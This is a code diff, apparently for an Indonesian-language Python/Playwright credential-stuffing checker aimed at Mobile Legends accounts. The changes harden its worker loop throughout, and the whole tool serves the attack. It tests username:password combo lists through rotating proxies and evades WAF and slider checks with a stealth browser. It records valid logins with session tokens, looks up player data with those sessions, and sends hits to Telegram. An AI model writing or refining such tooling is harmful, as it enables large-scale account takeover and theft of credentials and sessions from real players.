                 if params.get('response', {}).get('remoteIPAddress'):
-                    _live_reqs.add(params.get('requestId'))
+                    rid = params.get('requestId')
+                    if rid:
+                        _live_reqs.add(rid)
             def _on_load_done(params):
                 rid = params.get('requestId')
                 if rid in _live_reqs:
                     _live_reqs.discard(rid)
                     stats['bytes_used'] += params.get('encodedDataLength', 0) + 450
+            def _on_load_fail(params):
+                rid = params.get('requestId')
+                if rid:
+                    _live_reqs.discard(rid)
             cdp_net.on("Network.responseReceived", _on_resp_rx)
             cdp_net.on("Network.loadingFinished", _on_load_done)
+            cdp_net.on("Network.loadingFailed", _on_load_fail)
         except Exception:
             pass
-        await p.route(re.compile(r"\.(png|jpe?g|gif|webp|svg|woff2?|ttf|eot|ico|mp4|mp3|js|css)(\?|$)", re.I), _route_filter)
+        await p.route(_ROUTE_RE, _route_filter)
         p.set_default_timeout(12000)
         await p.goto(LOGIN_PAGE, wait_until="domcontentloaded", timeout=10000)
 
     async def open_context_and_page(max_attempts: int = 4, rotate_ip: bool = False) -> bool:
         """Buka context baru pada sticky proxy + navigasi ke login page."""
-        nonlocal worker_epoch, ctx, page, page2, rot_user_info, cur_proxy_info, pool_idx, slider_cleared, ctx_counted
+        nonlocal worker_epoch, ctx, page, page2, rot_user_info, cur_proxy_info, pool_idx, slider_cleared, ctx_counted, cur_browser
         if wave_limit and stats['checked'] >= wave_limit:
             return False
         if rotate_ip:
@@ -1828,8 +2043,8 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
         if browser_state is not None:
             if not browser_state['gate'].is_set():
                 try:
-                    await asyncio.wait_for(browser_state['gate'].wait(), timeout=25.0)
-                except Exception:
+                    await asyncio.wait_for(browser_state['gate'].wait(), timeout=35.0)
+                except asyncio.TimeoutError:
                     pass
             elif (
                 ensure_browser
@@ -1840,15 +2055,17 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                 browser_state['recycling'] = True
                 browser_state['gate'].clear()
                 try:
-                    await asyncio.wait_for(browser_state['zero_evt'].wait(), timeout=18.0)
+                    await asyncio.wait_for(browser_state['zero_evt'].wait(), timeout=20.0)
                 except Exception:
                     pass
                 did_recycle = False
                 try:
                     if browser_state['active'] == 0:
                         dbg("Periodic Chromium recycle (clean memory/speed reset)...")
-                        await ensure_browser(force_relaunch=True, stale_browser=browser)
-                        did_recycle = True
+                        ref_b = await ensure_browser()
+                        new_b = await ensure_browser(force_relaunch=True, stale_browser=ref_b)
+                        cur_browser = new_b
+                        did_recycle = (new_b is not ref_b)
                 except Exception:
                     pass
                 finally:
@@ -1861,31 +2078,47 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                 return False
             if attempt > 1:
                 worker_epoch += 1
+            rot_user_info = None
             if pool:
-                pool_idx = (pool_idx + 1) % len(pool)
-                cur_proxy_info = pool[pool_idx]
+                picked = None
+                for _ in range(len(pool)):
+                    pool_idx = (pool_idx + 1) % len(pool)
+                    cand = pool[pool_idx]
+                    pk = (cand.get('server', ''), cand.get('username', ''))
+                    if _PROXY_FAILS.get(pk, 0) < 3:
+                        picked = cand
+                        break
+                if picked is None:
+                    _PROXY_FAILS.clear()
+                    pool_idx = (pool_idx + 1) % len(pool)
+                    picked = pool[pool_idx]
+                cur_proxy_info = picked
             b = None
             try:
                 if browser_state is not None and not browser_state['gate'].is_set():
-                    await asyncio.wait_for(browser_state['gate'].wait(), timeout=25.0)
+                    try:
+                        await asyncio.wait_for(browser_state['gate'].wait(), timeout=45.0)
+                    except asyncio.TimeoutError:
+                        continue
                 if browser_state is not None and not ctx_counted:
                     ctx_counted = True
                     browser_state['active'] += 1
                     browser_state['zero_evt'].clear()
-                b = await ensure_browser() if ensure_browser else browser
+                b = await ensure_browser() if ensure_browser else cur_browser
                 try:
                     if hasattr(b, 'is_connected') and not b.is_connected() and ensure_browser:
                         b = await ensure_browser(force_relaunch=True, stale_browser=b)
                 except Exception:
                     if ensure_browser:
                         b = await ensure_browser(force_relaunch=True, stale_browser=b)
+                cur_browser = b
 
                 ctx_opts = {'has_touch': True}
                 if cur_proxy_info and cur_proxy_info.get('username'):
                     rot_user_info = await rotated_user_async(
                         cur_proxy_info['username'],
                         cur_proxy_info.get('server', ''),
-                        session_id=f"w{wid}e{worker_epoch}"
+                        session_id=f"w{wid}e{worker_epoch}a{attempt}"
                     )
                     proxy_conf = {
                         'server':   cur_proxy_info['server'],
@@ -1905,17 +2138,27 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
             except Exception as e:
                 err_s = str(e)
                 err_low = err_s.lower()
-                # ponytail: never relaunch shared browser on proxy/network net::ERR_* errors
-                if ensure_browser and ('err_' not in err_low and 'net::' not in err_low) and any(
+                is_browser_dead = ('err_' not in err_low and 'net::' not in err_low) and any(
                     k in err_low for k in ('browser has been closed', 'browser closed', 'connection closed', 'target page, context or browser has been closed')
-                ):
+                )
+                if is_browser_dead and b is not None:
                     try:
-                        await ensure_browser(force_relaunch=True, stale_browser=b)
+                        if hasattr(b, 'is_connected') and b.is_connected():
+                            is_browser_dead = False
                     except Exception:
                         pass
-                if 'ERR_TUNNEL_CONNECTION_FAILED' in err_s and rot_user_info:
+                if ensure_browser and is_browser_dead:
+                    try:
+                        await _close_ctx()
+                        cur_browser = await ensure_browser(force_relaunch=True, stale_browser=b)
+                    except Exception:
+                        pass
+                elif cur_proxy_info:
+                    pk = (cur_proxy_info.get('server', ''), cur_proxy_info.get('username', ''))
+                    _PROXY_FAILS[pk] = _PROXY_FAILS.get(pk, 0) + 1
+                if ('ERR_TUNNEL_CONNECTION_FAILED' in err_s or 'ERR_PROXY_CONNECTION_FAILED' in err_s) and rot_user_info:
                     bad_reg = rot_user_info.get('region', '').lower()
-                    if bad_reg:
+                    if bad_reg and bad_reg not in ('proxy', 'direct'):
                         async with _get_rotation_lock():
                             _TUNNEL_BLACKLIST.add(bad_reg)
                         dbg(f"w{wid} region [{bad_reg.upper()}] di-blacklist")
@@ -1961,7 +2204,27 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
         slider_cleared = True
         return True
 
-    async def handle_result(kind: str, res_data: dict, user: str, passw: str, dec_d: dict):
+    async def _lookup_player_valid(dec_d: dict):
+        global _lookup_exec
+        guid = dec_d.get('guid', '')
+        sess = dec_d.get('session', '')
+        guid_int = int(guid) if str(guid).isdigit() else 0
+        if not (INFO_OK and guid_int and sess and dm):
+            return None
+        try:
+            if _lookup_exec is None:
+                from concurrent.futures import ThreadPoolExecutor
+                _lookup_exec = ThreadPoolExecutor(max_workers=4, thread_name_prefix="mlbb_info")
+            loop = asyncio.get_running_loop()
+            return await asyncio.wait_for(
+                loop.run_in_executor(_lookup_exec, get_player_info, guid_int, sess, dm, 5),
+                timeout=15.0,
+            )
+        except Exception as ie:
+            dbg(f"w{wid} lookup err ({guid_int}): {ie}")
+            return None
+
+    async def handle_result(kind: str, res_data: dict, user: str, passw: str, dec_d: dict, info_res=None) -> str | None:
         iso_time = now()
         if kind == 'VALID':
             guid = dec_d.get('guid', '')
@@ -1969,19 +2232,8 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
             name = dec_d.get('name', '')
             append_line(FILES['VALID'], f"{user}:{passw}|{sess}|{guid}|{name}|{iso_time}")
             stats['valid'] += 1
-            info_res = None
-            guid_int = int(guid) if str(guid).isdigit() else 0
-            if INFO_OK and guid_int and sess and dm:
-                try:
-                    loop = asyncio.get_running_loop()
-                    info_res = await asyncio.wait_for(
-                        loop.run_in_executor(None, get_player_info, guid_int, sess, dm, 5),
-                        timeout=15.0,
-                    )
-                except Exception as ie:
-                    dbg(f"w{wid} lookup err ({guid_int}): {ie}")
             print_hit(user, passw, dec_d, info_res)
-            await send_tg(
+            return (
                 f"✅ <b>VALID</b>\n"
                 f"<code>{esc_html(user)}:{esc_html(passw)}</code>\n"
                 f"Session: <code>{esc_html(sess)}</code>\n"
@@ -1998,19 +2250,24 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
             append_line(FILES['OTP'], f"{user}:{passw}|{masked_email}|{iso_time}")
             stats['otp'] += 1
             print_result('OTP', user, passw, f"Email: {masked_email}")
-            await send_tg(f"🔑 <b>2FA / OTP</b>\n<code>{esc_html(user)}:{esc_html(passw)}</code>\nEmail: {esc_html(masked_email)}")
+            return f"🔑 <b>2FA / OTP</b>\n<code>{esc_html(user)}:{esc_html(passw)}</code>\nEmail: {esc_html(masked_email)}"
         elif kind == 'INVALID':
             append_line(FILES['INVALID'], f"{user}:{passw}|{iso_time}")
             stats['invalid'] += 1
             print_result('INVALID', user, passw, res_data.get('message', 'Wrong pass'))
+            return None
         else:
             why = res_data.get('message', kind)
             append_line(FILES['ERR'], f"{user}:{passw}|{why}|{iso_time}")
             stats['error'] += 1
             print_result('ERR', user, passw, why)
+            return None
 
     async def _clear_otp_form(p):
         try:
+            if LOGIN_PAGE.split('?', 1)[0] not in (p.url or ''):
+                await p.goto(LOGIN_PAGE, wait_until="domcontentloaded", timeout=12000)
+                return
             await p.evaluate("""() => {
                 let el = document.querySelector('.content-but');
                 while (el) {
@@ -2055,15 +2312,16 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                 return page is not None
             ctx_gen += 1
             recovering = True
+            still_busy = False
             if inflight_tabs > 0:
                 try:
-                    await asyncio.wait_for(ctx_cond.wait_for(lambda: inflight_tabs == 0), timeout=18.0)
+                    await asyncio.wait_for(ctx_cond.wait_for(lambda: inflight_tabs == 0), timeout=45.0)
                 except Exception:
-                    pass
+                    still_busy = inflight_tabs > 0
         try:
-            if reason != 'waf_refresh':
+            if reason != 'waf_refresh' or still_busy:
                 ctx_accts = 0
-            if reason == 'waf_refresh' and page is not None:
+            if reason == 'waf_refresh' and not still_busy and page is not None:
                 try:
                     await page.goto(LOGIN_PAGE, wait_until="domcontentloaded", timeout=12000)
                     slider_cleared = False
@@ -2072,10 +2330,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                             try:
                                 await page2.goto(LOGIN_PAGE, wait_until="domcontentloaded", timeout=12000)
                             except Exception:
-                                try:
-                                    await page2.close()
-                                except Exception:
-                                    pass
+                                await _cleanup_page(page2, close_page=True)
                                 page2 = None
                         return True
                 except Exception:
@@ -2087,7 +2342,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                 ctx_cond.notify_all()
 
     async def _tab_loop(tab_idx: int):
-        nonlocal page2, ctx_accts, inflight_tabs, tab0_done
+        nonlocal page2, ctx_accts, inflight_tabs, tab0_done, cur_browser
         p2_miss = 0
         try:
           while True:
@@ -2099,10 +2354,13 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                 break
 
             done_item = False
+            requeued = False
             try:
                 while True:
                     need_recover_gen = None
                     p_tab = None
+                    can_create_p2 = False
+                    my_gen = ctx_gen
                     async with ctx_cond:
                         while recovering:
                             await ctx_cond.wait()
@@ -2113,10 +2371,15 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                             if p_tab is not None:
                                 my_gen = ctx_gen
                                 inflight_tabs += 1
+                            elif tab_idx == 1 and slider_cleared and (ctx_accts >= 1 or tab0_done) and not (wave_limit and stats['checked'] >= wave_limit):
+                                can_create_p2 = True
+                                my_gen = ctx_gen
+                                inflight_tabs += 1
 
                     if need_recover_gen is not None:
                         if wave_limit and stats['checked'] >= wave_limit:
                             combo_q.put_nowait((u, pw))
+                            requeued = True
                             combo_q.task_done()
                             done_item = True
                             break
@@ -2124,6 +2387,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                         if not ok_ctx:
                             if wave_limit and stats['checked'] >= wave_limit:
                                 combo_q.put_nowait((u, pw))
+                                requeued = True
                                 combo_q.task_done()
                                 done_item = True
                                 break
@@ -2131,41 +2395,52 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                         continue
 
                     if p_tab is None:
-                        # Tab 1: wait for Tab 0 to earn 1st-login WAF cookie before launching Tab 2
-                        if tab_idx == 1 and ctx is not None and slider_cleared:
-                            if ctx_accts < 1 and not tab0_done:
-                                await asyncio.sleep(0.3)
-                                continue
+                        if can_create_p2:
                             new_p2 = None
                             try:
-                                my_gen_p2 = ctx_gen
-                                new_p2 = await ctx.new_page()
-                                await _attach_page(new_p2)
-                                if my_gen_p2 == ctx_gen and ctx is not None:
-                                    page2 = new_p2
-                                    p2_miss = 0
-                                    continue
-                                await new_p2.close()
+                                if ctx is not None and my_gen == ctx_gen:
+                                    new_p2 = await ctx.new_page()
+                                    await _attach_page(new_p2)
+                                    if my_gen == ctx_gen and ctx is not None:
+                                        page2 = new_p2
+                                        p2_miss = 0
+                                        new_p2 = None
                             except Exception:
-                                if new_p2 is not None:
-                                    try:
-                                        await new_p2.close()
-                                    except Exception:
-                                        pass
                                 page2 = None
+                            finally:
+                                if new_p2 is not None:
+                                    await _cleanup_page(new_p2, close_page=True)
+                                async with ctx_cond:
+                                    inflight_tabs = max(0, inflight_tabs - 1)
+                                    ctx_cond.notify_all()
+                            if page2 is not None:
+                                continue
+                        if wave_limit and stats['checked'] >= wave_limit:
+                            combo_q.put_nowait((u, pw))
+                            requeued = True
+                            combo_q.task_done()
+                            done_item = True
+                            break
+                        if tab_idx == 1 and ctx is not None and slider_cleared and ctx_accts < 1 and not tab0_done:
+                            await asyncio.sleep(0.3)
+                            continue
                         p2_miss += 1
                         if p2_miss > 10:
-                            # Tab 1 sementara bermasalah di context ini: kembalikan item & tunggu context baru (kecuali Tab 0 selesai / wave selesai)
                             combo_q.put_nowait((u, pw))
+                            requeued = True
                             combo_q.task_done()
                             done_item = True
                             stuck_gen = ctx_gen
-                            for _ in range(30):
-                                if tab0_done or (wave_limit and stats['checked'] >= wave_limit):
-                                    return
-                                if ctx_gen != stuck_gen:
-                                    break
-                                await asyncio.sleep(0.5)
+                            async with ctx_cond:
+                                try:
+                                    await asyncio.wait_for(
+                                        ctx_cond.wait_for(
+                                            lambda: tab0_done or ctx_gen != stuck_gen or (wave_limit and stats['checked'] >= wave_limit)
+                                        ),
+                                        timeout=15.0,
+                                    )
+                                except asyncio.TimeoutError:
+                                    pass
                             p2_miss = 0
                             if tab0_done or (wave_limit and stats['checked'] >= wave_limit):
                                 return
@@ -2188,13 +2463,18 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                     if kind in ('VALID', 'INVALID', 'OTP', 'UNKNOWN'):
                         if kind in ('VALID', 'OTP'):
                             await _clear_otp_form(p_tab)
-                        _acct_retries.pop(f"{u}:{pw}", None)
-                        ctx_accts += 1
+                        dec_d = res_data.get('decrypted_data', {})
+                        info_res = await _lookup_player_valid(dec_d) if kind == 'VALID' else None
+                        _acct_retries.pop(_norm_combo_key(u, pw), None)
+                        if my_gen == ctx_gen:
+                            ctx_accts += 1
                         stats['checked'] += 1
-                        await handle_result(kind, res_data, u, pw, res_data.get('decrypted_data', {}))
+                        tg_msg = await handle_result(kind, res_data, u, pw, dec_d, info_res=info_res)
                         combo_q.task_done()
                         done_item = True
                         print_progress()
+                        if tg_msg:
+                            await send_tg(tg_msg)
                         if (not wave_limit or stats['checked'] < wave_limit) and (ctx_accts >= ACCOUNTS_PER_CTX or (browser_state is not None and browser_state['recycling'])):
                             await _recover_ctx(my_gen, 'periodic_rotate')
                         break
@@ -2205,16 +2485,38 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                         continue
 
                     err_low = err_msg.lower()
-                    if any(k in err_low for k in ('cloakbrowser', 'license key', 'session limit', 'browser has been closed', 'browser closed')):
-                        # Browser/license failure: do NOT record account in err.txt; re-queue & restart browser cleanly
-                        activate_cloak_license()
-                        if 'session limit' in err_low:
-                            await asyncio.sleep(15.0)
-                        if ensure_browser:
-                            await ensure_browser(force_relaunch=True, stale_browser=browser)
-                        raise RuntimeError(f"w{wid}_browser_license_restart")
+                    if any(k in err_low for k in ('cloakbrowser', 'license key', 'session limit', 'browser has been closed', 'browser closed', 'connection closed', 'target page, context or browser has been closed')) and ('net::' not in err_low and 'err_' not in err_low):
+                        is_lic = any(k in err_low for k in ('cloakbrowser', 'license key', 'session limit'))
+                        b_dead = is_lic or (cur_browser is None)
+                        if not b_dead:
+                            try:
+                                b_dead = not cur_browser.is_connected()
+                            except Exception:
+                                b_dead = True
+                        if b_dead:
+                            activate_cloak_license()
+                            if 'session limit' in err_low:
+                                await asyncio.sleep(15.0)
+                            if ensure_browser:
+                                await _close_ctx()
+                                cur_browser = await ensure_browser(force_relaunch=True, stale_browser=cur_browser)
+                            raise RuntimeError(f"w{wid}_browser_license_restart")
+                        if not await _recover_ctx(my_gen, 'rotate'):
+                            raise RuntimeError(f"w{wid}_ctx_recovery_failed")
+                        continue
 
-                    k_id = f"{u}:{pw}"
+                    if wave_limit and stats['checked'] >= wave_limit:
+                        combo_q.put_nowait((u, pw))
+                        requeued = True
+                        combo_q.task_done()
+                        done_item = True
+                        break
+
+                    if res_data.get('proxy_407') and cur_proxy_info:
+                        pk = (cur_proxy_info.get('server', ''), cur_proxy_info.get('username', ''))
+                        _PROXY_FAILS[pk] = _PROXY_FAILS.get(pk, 0) + 3
+
+                    k_id = _norm_combo_key(u, pw)
                     _acct_retries[k_id] = _acct_retries.get(k_id, 0) + 1
                     if _acct_retries[k_id] > 4:
                         _acct_retries.pop(k_id, None)
@@ -2225,18 +2527,12 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                         print_progress()
                         break
 
-                    if wave_limit and stats['checked'] >= wave_limit:
-                        combo_q.put_nowait((u, pw))
-                        combo_q.task_done()
-                        done_item = True
-                        break
-
                     if kind == 'WAF':
                         stats['waf'] += 1
                         waf_mode = 'rotate' if _acct_retries[k_id] >= 2 else 'waf_refresh'
                         if not await _recover_ctx(my_gen, waf_mode):
                             raise RuntimeError(f"w{wid}_waf_recovery_failed")
-                    elif kind == 'RATE' or any(k in err_msg for k in ('TUNNEL', 'PROXY', 'CONNECTION_FAILED', 'Connection closed', 'Target closed')) or err_msg == 'timeout_waiting_response':
+                    elif kind == 'RATE' or res_data.get('proxy_407') or any(k in err_msg for k in ('TUNNEL', 'PROXY', 'CONNECTION_FAILED', 'Connection closed', 'Target closed')) or err_msg == 'timeout_waiting_response':
                         if not await _recover_ctx(my_gen, 'rotate'):
                             raise RuntimeError(f"w{wid}_rate_recovery_failed")
                     else:
@@ -2244,16 +2540,21 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                         if not await _recover_ctx(my_gen, err_mode):
                             raise RuntimeError(f"w{wid}_err_recovery_failed")
             except BaseException:
-                if not done_item:
+                if not done_item and not requeued:
                     try:
                         combo_q.put_nowait((u, pw))
                     except Exception:
                         pass
-                    combo_q.task_done()
+                    try:
+                        combo_q.task_done()
+                    except Exception:
+                        pass
                 raise
         finally:
           if tab_idx == 0:
-            tab0_done = True
+            async with ctx_cond:
+                tab0_done = True
+                ctx_cond.notify_all()
 
     tab_tasks = []
     try:
@@ -2352,7 +2653,7 @@ async def async_main():
         print("[✓] All self-tests passed successfully!")
         return
 
-    global DEBUG, HEADLESS, NUM_CONTEXTS, TWO_TAB, PROXY_ENABLED, PROXY_FILE, OUTPUT_DIR, _TUI_ACTIVE, _pw_instance, _driver_pid
+    global DEBUG, HEADLESS, NUM_CONTEXTS, TWO_TAB, PROXY_ENABLED, PROXY_FILE, OUTPUT_DIR, _TUI_ACTIVE, _pw_instance, _driver_pid, _lookup_exec
     TWO_TAB = bool(args.two_tab)
 
     combo_path = ''
@@ -2410,8 +2711,8 @@ async def async_main():
         workers_str = ask("Worker threads (1-30, rec 4-6)", "4")
         workers = max(1, min(30, int(workers_str) if workers_str.isdigit() else 5))
         TWO_TAB = ask_yn("2-tab extra worker? (2 tab/context, lebih cepat)", default='y' if args.two_tab else 'n')
-        HEADLESS = True  # ponytail: always headless
-        DEBUG = False
+        HEADLESS = True if args.headless is None else args.headless
+        DEBUG = bool(args.debug)
 
         # Proxy prompt: directly ask proxy file (empty = direct), no extra y/n prompts
         default_proxy = os.path.join(BASE, 'input', 'proxies.txt')
@@ -2452,7 +2753,7 @@ async def async_main():
     os.makedirs(OUTPUT_DIR, exist_ok=True)
     combos = load_combos(combo_path)
     done_accounts = load_done()
-    queue = [x for x in combos if f"{x[0]}:{x[1]}".lower() not in done_accounts]
+    queue = [x for x in combos if _norm_combo_key(x[0], x[1]) not in done_accounts]
 
     _print_box("CONFIGURATION", [
         f" {c(WHITE)}Queue   :{W} {c(GREEN)}{len(queue):,} accounts{W} {c(GRAY)}(tot:{len(combos):,}, done:{len(done_accounts):,}){W}",
@@ -2514,15 +2815,15 @@ async def async_main():
                     try:
                         await asyncio.wait_for(cur.close(), timeout=5.0)
                     except Exception:
-                        _emergency_cleanup()
+                        _kill_driver_tree()
                     browser_ref[0] = None
-                    _driver_pid = None
                 if _pw_instance is not None:
                     try:
                         await asyncio.wait_for(_pw_instance.stop(), timeout=3.0)
                     except Exception:
-                        pass
+                        _kill_driver_tree()
                     _pw_instance = None
+                _driver_pid = None
                 if force_relaunch:
                     await asyncio.sleep(2.0)
                 browser_ref[0] = await launch_browser_smart(headless=HEADLESS, humanize=False)
@@ -2555,11 +2856,12 @@ async def async_main():
                 p_out(f"  {c(GRAY)}Eksekusi dibatalkan otomatis untuk melindungi IP asli kamu.{W}\n")
                 return
 
+        _PROXY_FAILS.clear()
         stats['total'] = len(queue)
         stats['start'] = time.time()
         stats['workers_total'] = stats['workers'] = min(NUM_CONTEXTS, len(queue))
         stats['proxy_label'] = f"{os.path.basename(PROXY_FILE)} ({len(live_pool or [])} live)" if PROXY_ENABLED else "None (Direct)"
-        _TUI_ACTIVE = _IS_TTY and (_TERM != 'dumb')
+        _TUI_ACTIVE = bool(_IS_TTY and (_TERM != 'dumb') and _COLOR_OK)
         if _TUI_ACTIVE:
             sys.stdout.write("\033[?1049h\033[?25l\033[2J\033[H")
             sys.stdout.flush()
@@ -2571,12 +2873,12 @@ async def async_main():
         for item in queue:
             combo_q.put_nowait(item)
 
+        acct_retries = {}
 
         # Worker wrapper: auto-restart jika worker crash sebelum queue habis / batas wave 1k.
         async def worker_with_restart(wid: int, p_info, wave_limit: int = 0, wave_idx: int = 0):
             MAX_CONSECUTIVE_FAILS = 10
             fail_count = 0
-            acct_retries = {}
             while not combo_q.empty() and not (wave_limit and stats['checked'] >= wave_limit):
                 started_at = time.time()
                 try:
@@ -2611,10 +2913,13 @@ async def async_main():
                         print_result('ERR', f"worker-{wid}", "sys", f"restart #{fail_count}")
                     await asyncio.sleep(wait)
 
+        aborted_on_errors = False
         try:
             wave_idx = 0
             while not combo_q.empty():
-                wave_limit = stats['checked'] + WAVE_REFRESH_EVERY
+                _PROXY_FAILS.clear()
+                checked_before = stats['checked']
+                wave_limit = checked_before + WAVE_REFRESH_EVERY
                 num_workers = min(NUM_CONTEXTS, combo_q.qsize())
                 stats['workers'] = num_workers
                 stats['workers_total'] = num_workers
@@ -2628,7 +2933,10 @@ async def async_main():
 
                 await asyncio.gather(*tasks)
 
-                if combo_q.empty() or stats['checked'] < wave_limit:
+                if combo_q.empty():
+                    break
+                if stats['checked'] == checked_before or stats['checked'] < wave_limit:
+                    aborted_on_errors = True
                     break
 
                 # ponytail: full clean wave restart every 1k accounts; keep _STATIC_CACHE and _TUNNEL_BLACKLIST
@@ -2639,7 +2947,19 @@ async def async_main():
                 else:
                     p_out(f"\n{c(CYAN)}[*] Refresh penuh wave #{wave_idx} ({stats['checked']:,} akun): restart semua worker & Chromium...{W}")
                 gc.collect()
-                await ensure_browser(force_relaunch=True, stale_browser=browser_ref[0])
+                for _rw in range(3):
+                    try:
+                        await ensure_browser(force_relaunch=True, stale_browser=browser_ref[0])
+                        break
+                    except Exception as r_ex:
+                        if _rw == 2:
+                            aborted_on_errors = True
+                            if not _TUI_ACTIVE:
+                                p_out(f"{c(RED)}[!] Gagal refresh browser wave #{wave_idx}: {r_ex}{W}")
+                            break
+                        await asyncio.sleep(10.0 * (_rw + 1))
+                if aborted_on_errors:
+                    break
                 browser_state['born_ctx'] = stats['proxy_ctx']
                 browser_state['active'] = 0
                 browser_state['recycling'] = False
@@ -2662,14 +2982,20 @@ async def async_main():
             try:
                 await asyncio.wait_for(browser_ref[0].close(), timeout=5.0)
             except Exception:
-                _emergency_cleanup()
-            _driver_pid = None
+                _kill_driver_tree()
         if _pw_instance:
             try:
                 await asyncio.wait_for(_pw_instance.stop(), timeout=3.0)
             except Exception:
-                pass
+                _kill_driver_tree()
             _pw_instance = None
+        _driver_pid = None
+        if _lookup_exec is not None:
+            try:
+                _lookup_exec.shutdown(wait=False, cancel_futures=True)
+            except Exception:
+                pass
+            _lookup_exec = None
         if _LICENSE_SESSION_ACTIVE:
             withdraw_cloak_license()
             p_out(f"{c(GRAY)}[*] License key CloakBrowser ditarik dari device ✓{W}")
@@ -2686,7 +3012,9 @@ async def async_main():
         f" {c(CYAN)}SPEED / TIME {W} : {ck/el:.2f} acc/s  ({int(el)}s)",
         f" {c(GOLD)}PROXY QUOTA  {W} : {_fmt_bytes(stats['bytes_used'])} ({_fmt_bytes(int(stats['bytes_used']/max(ck,1)))}/acc)",
         f" {c(GRAY)}OUTPUT DIR   {W} : {shortpath(OUTPUT_DIR)}/",
-    ], bc=GREEN)
+    ], bc=(GOLD if aborted_on_errors else GREEN))
+    if aborted_on_errors:
+        p_out(f"{c(GOLD)}[!] Dihentikan lebih awal: worker berhenti atau gagal refresh (sisa {combo_q.qsize():,} akun belum diperiksa).{W}")
 
 def main():
     try:
